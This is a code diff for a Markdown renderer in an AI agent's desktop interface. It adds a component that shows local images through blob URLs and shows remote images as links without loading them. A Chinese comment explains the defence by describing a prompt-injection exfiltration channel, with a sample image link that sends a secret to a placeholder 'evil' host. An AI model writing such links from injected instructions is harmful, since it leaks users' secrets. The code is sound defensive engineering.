@@ -11,15 +11,16 @@ import ReactMarkdown, { defaultUrlTransform } from "react-markdown";
 import rehypeHighlight from "rehype-highlight";
 import remarkGfm from "remark-gfm";
 
-import { openInBrowser, openPath } from "../bridge";
+import { openInBrowser, openPath, readFileBytes } from "../bridge";
 import { useTimedFlag } from "../hooks/useTimedFlag";
 import { t, useT } from "../i18n";
 import { openSession, sessionIdFromHref } from "../lib/sessionLink";
 import { AGENT_LINK_SCHEME, openSubagent } from "../lib/subagentLink";
-import { joinRoot, looksAbsPath } from "../pathDisplay";
+import { basename, joinRoot, looksAbsPath } from "../pathDisplay";
 import { type Theme, getTheme, subscribeTheme } from "../theme";
-import { openFilePreview } from "./FilePreview";
+import { imageMimeOf, openFilePreview } from "./FilePreview";
 import { MermaidBlock } from "./Mermaid";
+import { ShotViewer } from "./ToolCard";
 
 import hljsDarkCss from "highlight.js/styles/github-dark-dimmed.css?inline";
 import hljsLightCss from "highlight.js/styles/github.css?inline";
@@ -273,6 +274,7 @@ export const Markdown = memo(function Markdown({
         components={{
           pre: CodeBlock,
           a: MdLink,
+          img: MdImage,
         }}
       >
         {text}
@@ -288,12 +290,17 @@ export const Markdown = memo(function Markdown({
  * 模型写的真实路径就这么丢了，[`MdLink`] 只能退回"拿链接文字当相对
  * 路径猜"，猜错就是无声无息。链接的打开全部由 [`MdLink`] 接管
  * （preventDefault），file: 不会真的交给 webview 导航，放行它不会
- * 打开 javascript: 那类注入面。
+ * 打开 javascript: 那类注入面。图片的 src 走同一个变换，由 [`MdImage`]
+ * 接管，同理。
  */
 function keepFileUrls(url: string): string {
   // `agent:` 是子 agent 链接（Task 工具让模型这么写），`riot:` 是历史会话
   // 链接（系统提示词 past_sessions 一节），都由 MdLink 接管。
-  return /^(file|agent|riot):/i.test(url) ? url : defaultUrlTransform(url);
+  if (/^(file|agent|riot):/i.test(url)) return url;
+  // Windows 盘符路径（`C:\…`、`D:/…`）：白名单把 `C` 当成未知协议清掉，
+  // 模型写的绝对路径就没了。它不是 URL，也不会交给 webview 导航。
+  if (/^[a-z]:[\\/]/i.test(url)) return url;
+  return defaultUrlTransform(url);
 }
 
 /**
@@ -505,6 +512,134 @@ function fileUrlToPath(url: string): string | null {
   } catch {
     return null;
   }
+}
+
+/**
+ * Markdown 图片：`![说明](路径)`。
+ *
+ * 模型这么写是要把一张图**贴给用户看**，自己并不需要看 —— 系统提示词和
+ * Read 的工具提示都教它：只给用户看的图不要 Read（读一张图要花上千
+ * token，还会一直留在上下文里），写成图片引用就行。这条路上模型一个
+ * token 都不花，图从磁盘直接进界面。
+ *
+ * 不能把 src 原样交给 `<img>`：webview 不加载 `file://`，纯路径会被解析
+ * 成应用 origin 下的地址（和 [`MdLink`] 面对的是同一个问题），结果是一张
+ * 裂图。本地路径按 [`resolveMdLink`] 同一套规则收成绝对路径，再经
+ * `read_file_bytes` 读进来转 blob URL —— 和文件预览的图片查看同一条路、
+ * 同一道预览围栏（见宿主的 preview 模块）。
+ *
+ * `[约束]` http(s) 的图**不加载**，渲染成一个用系统浏览器打开的链接。
+ * 一是 CSP 的 img-src 没放行远程源；二是这正是提示注入借图片外传数据的
+ * 经典通道 —— 网页里的一句话让模型写出 `![](https://evil/?q=<密钥>)`，
+ * webview 一加载就把数据送出去了。模型要看远程图走 WebFetch，那条路有
+ * 准入和授权。
+ */
+function MdImage({
+  src,
+  alt,
+  title,
+}: {
+  src?: string | undefined;
+  alt?: string | undefined;
+  title?: string | undefined;
+}) {
+  const root = useContext(ProjectRootContext);
+  const target = resolveMdLink(src, "", root);
+  const label = alt?.trim() ?? "";
+
+  if (!target || target.kind === "agent" || target.kind === "session") {
+    return label ? <span className="md-img-broken">{label}</span> : null;
+  }
+  if (target.kind === "url") {
+    return (
+      <span className="md-img-remote">
+        <MdLink href={target.href}>{label || target.href}</MdLink>
+      </span>
+    );
+  }
+  // 不是界面认得的图片类型（模型把 pdf / docx 写成了图片引用）就按
+  // 文件链接给，点开走预览，好过一张永远加载不出来的图。
+  const mime = imageMimeOf(target.value);
+  if (!mime) {
+    return <MdLink href={target.href}>{label || basename(target.value)}</MdLink>;
+  }
+  // 按路径 key：换了路径整个重挂，旧 blob 在卸载时释放，不会有一帧
+  // 显示着已经 revoke 掉的地址。
+  return (
+    <LocalImage key={target.value} path={target.value} mime={mime} alt={label} title={title} />
+  );
+}
+
+/** 磁盘上的一张图：读进来贴出，点击全屏放大（和工具卡片里的截图同一个查看器）。 */
+function LocalImage({
+  path,
+  mime,
+  alt,
+  title,
+}: {
+  path: string;
+  mime: string;
+  alt: string;
+  title?: string | undefined;
+}) {
+  const { t } = useT();
+  const [src, setSrc] = useState<string | null>(null);
+  const [failed, setFailed] = useState(false);
+  const [viewer, setViewer] = useState(false);
+  const name = alt || basename(path);
+
+  useEffect(() => {
+    let stale = false;
+    let url: string | null = null;
+    readFileBytes(path).then(
+      (buf) => {
+        if (stale) return;
+        url = URL.createObjectURL(new Blob([buf], { type: mime }));
+        setSrc(url);
+      },
+      () => {
+        if (!stale) setFailed(true);
+      },
+    );
+    return () => {
+      stale = true;
+      if (url) URL.revokeObjectURL(url);
+    };
+  }, [path, mime]);
+
+  if (failed) {
+    // 读不到（围栏外、超上限、已删除）：留一个能点的文件链接 —— 点开走
+    // 预览那条路，预览也读不到时会退到访达定位，用户至少知道图在哪。
+    return (
+      <span className="md-img-broken">
+        <MdLink href={toFileHref(path)}>{name}</MdLink>
+        <span className="md-link-err" role="status">
+          {t("transcript.md.imageUnavailable")}
+        </span>
+      </span>
+    );
+  }
+  if (!src) {
+    return (
+      <span className="md-img-pending" title={path}>
+        {name}
+      </span>
+    );
+  }
+  return (
+    <>
+      <button
+        type="button"
+        className="md-img-wrap"
+        onClick={() => setViewer(true)}
+        aria-label={t("transcript.image.zoomNamed", { name })}
+        title={title ?? path}
+      >
+        <img className="md-img" src={src} alt={name} />
+      </button>
+      {viewer ? <ShotViewer src={src} alt={name} onClose={() => setViewer(false)} /> : null}
+    </>
+  );
 }
 
 /** 代码块：语言标签（或代码引用的路径）+ 复制按钮。 */
